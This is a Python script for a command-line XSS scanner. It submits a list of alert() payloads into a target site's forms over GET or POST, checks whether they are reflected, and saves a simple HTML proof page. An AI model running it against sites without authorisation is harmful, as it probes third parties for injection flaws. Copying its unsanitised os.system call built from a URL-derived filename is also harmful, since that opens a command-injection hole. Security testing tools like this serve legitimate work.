# xss scaner
import os
import requests as r
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import time

Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
B = "\033[34m"    # Blue
C = "\033[36m"    # Cyan
#--------
user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
head={"User-Agent":user_agent}
#--------
payloads=["<script>alert(1);</script>",
"<IMG SRC=\"javascript:alert('XSS');\">",
"<IMG SRC=javascript:alert('XSS')>",
'<img src\x11=x onerror="javascript:alert(1)">',"<img src/onerror=alert('Test')>",'Test_xss"><script>alert(1)</script>','Test_xss"/><script>alert(1)</script>',"<svg><script>alert&#40;1)</script>",
"--!><svg/onload=alert(1)"]


def paychoice():
   print("    ---( payloads )---")
   print("[0] <script>alert(1);</script>")
   print("[1] <IMG SRC=\"javascript:alert('XSS');\">")
   print("[2] <IMG SRC=javascript:alert('XSS')>")
   print('[3] <img src\x11=x onerror="javascript:alert(1)">')
   print("[4] <img src/onerror=alert('Test')>")
   print('[5] Test_xss"><script>alert(1)</script>')
   print('[6] Test_xss"/><script>alert(1)</script>')
   print("[7] <svg><script>alert&#40;1)</script>")
   print("[8] <svg/onload=alert(1)")
   print("[9] --!><svg/onload=alert(1)")
   print("[10] New payload (input) ")
def xss_PoC(url,dic,method):
  if "https://" in url:
   name=url.replace("https://","")
  elif "http://" in url:
   name=url.replace("http://","")
  code=f'''<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Xss Eye</title>
  <link rel="stylesheet" href="index.css">
  </head>
<body style="background-color:#a0d9e7;">
    <h1 style="text-align:center;">Xss Vulnerable</h1>
    <p>This is not PoC,But it help you</p>
    <h3>[+] Method : {method}</h3>
    <h4>[+] Data : {dic}</h4>
    <h4>[+] Payload : </h4>
    <button  style="margin-left:35%;"    onclick="window.location.href ='{url}' ">Click Here
    </button>
</body>
</html>'''
  with open("xss"+name+".html","w") as file:
      file.write(code)
      file.close
      print(f"{G}[file] PoC file {name}.html Saved{W}")
      os.system(f"mv xss{name}.html files/PoC")
    	
def xss(url):
 req=r.get(url,headers=head)
 soup = bs(req.content, "html.parser")
 forms=soup.find_all("form")
 if len(forms) != 0:
   print(f"{G}[+] Form Found{W}")
   print(" ")   # :)
   paychoice()
   print(Y)
   ch=int(input("[inp] Enter your choice :: "))
   if ch==10:
    global payload 
    payload=input(f"{G}[inp] paste payload :: ")
   elif ch <10:
    payload=payloads[ch]
 else:
 	print(25*"-")
 	print(f"{R}[-] Form Not Found{W}")
 	print(25*"-")
 for form in forms:
   try:
    act=form["action"]
   except:
     act=url  
   dic={}
   print(5*"-"+"Form Details"+5*"-")
   for key in form.find_all(["input","textarea"]):
    try:
     if key["type"] =="text":
       print(f"{Y}[~] Text   : {key['name']}{W}")
       dic.update({key["name"]:payload})
       form_text=True
     elif key["type"]=="password":
        print(f"{Y}[~] Password :{key['name']}{W}")
        dic.update({key["name"]:payload})
        form_pass=True
     elif key["type"] =="file":
     	print(f"{Y}[~] File :{key['name']}{W}")
     	form_file=True
     elif key["type"] == "submit":
       print(f"{Y}[~] Submit : {key['name']}{W}") 
       dic.update({key["name"]:key["name"]})
       form_submit=True
    except Exception as e:
     print(e)
   try:
    method=form["method"]
   except:
     method="get"
   if method.lower().strip()=="post":  # POST
    print(f"{G}[~] Method : POST{W}")
    print("")
    print(f"[•] payload : {C}{payload}{W}")
    s=r.Session()
    req=s.post(urljoin(url,act),data=dic,headers=head)
    ty=req.headers["Content-Type"]
    print(f"[•] Content-type : {ty}")
    if payload in req.text:
     print(f"\n{G}[warning] Xss vulnerable{W}")   
     xss_PoC(url,dic,"POST")     
    else:
     print(f"{R}[info] Xss not vulnerable{W}")
     
   elif method.lower().strip()=="get": # GET
     print(f"{G}[~] Method : GET{W}")
     print(25*"-")
     print(f"{C}[•] payload : {C}{payload}{W}")
     s=r.Session()
     req=s.get(urljoin(url,act),params=dic,headers=head)
     ty=req.headers["Content-Type"]
     print(f"[•] Content-type : {ty}")
     if payload  in req.text:
      print(f"\n{G}[warning] Xss vulnerable{W}")
      print(f"{Y}[Url] {req.url}{W}")
      url=req.url
      xss_PoC(url,dic,"GET")
     else:
      print(f"{R}[info] Xss not vulnerable{W}")
  

def xss_main():
  os.system("figlet Xss Form")
  url=input(f"\n{B}[+] Enter Url : {W}")
  print(f"\n[~] Url Checking  : {url}")
  flag_url=False
  try:
    responce=r.get(url,headers={"User-Agent":user_agent})
    print(f"[~] Status code : {G}{responce.status_code}{W}")
    flag_url=True
  except Exception as e:
    time.sleep(2)
    print(R)
    print(f"[•] Unable to connect ...")
    pass
  if flag_url ==True:
  	xss(url)
  
    	